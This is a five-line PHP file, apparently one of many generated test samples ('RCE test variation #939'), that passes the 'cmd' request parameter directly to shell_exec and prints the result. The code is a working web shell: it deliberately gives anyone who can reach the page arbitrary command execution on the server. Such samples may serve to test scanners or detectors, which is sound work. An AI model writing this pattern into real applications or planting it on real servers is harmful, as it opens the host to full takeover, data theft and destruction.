<?php
// RCE test variation #939
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>